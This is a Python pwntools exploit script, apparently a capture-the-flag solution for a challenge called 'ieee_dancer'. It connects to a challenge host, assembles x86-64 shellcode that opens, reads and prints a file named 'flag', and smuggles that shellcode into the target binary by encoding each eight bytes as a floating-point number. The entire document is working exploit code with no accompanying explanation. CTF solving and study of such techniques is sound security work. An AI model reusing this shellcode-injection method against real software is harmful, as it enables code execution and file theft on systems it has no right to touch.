from pwn import *
from math import ceil

import struct


exe = ELF("./ieee_dancer")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("dancer.chals.nitectf25.live", 1337, ssl = True)

    return r


def qword_to_double(qword_bytes: bytes):
    qword_bytes = qword_bytes.ljust(8, b"\x00")     # pad to 8 bytes if needed
    qword = u64(qword_bytes)
    return struct.unpack("<d", struct.pack("<Q", qword))[0]


def main():
    r = conn()

    shellcode = asm("""
        /* fd = open("flag.txt", O_RDONLY) */
        lea rdi, [rip + flag];
        xor rsi, rsi;
        mov rax, 2;
        syscall;
        mov r12, rax;

        /* sz = read(fd, buf, 256) */
        mov rdi, r12;
        lea rsi, [rip + buf];
        mov rdx, 256;
        mov rax, 0;
        syscall;
        mov r12, rax;

        /* write(1, buf, sz) */
        mov rdi, 1;
        lea rsi, [rip + buf];
        mov rdx, r12;
        mov rax, 1;
        syscall;

        /* exit(0) */
        xor rdi, rdi;
        mov rax, 0x3c;
        syscall;

        flag:
            .asciz "flag"
        buf:
            .zero 256
    """)

    size = ceil(len(shellcode) / 8)
    r.sendlineafter(b"want to enter!", str(size).encode())
    print(size)

    for i in range(0, len(shellcode), 8):
        d = qword_to_double(shellcode[i:i+8])
        r.sendline(str(d).encode("ascii"))

    r.interactive("$ ")

if __name__ == "__main__":
    main()
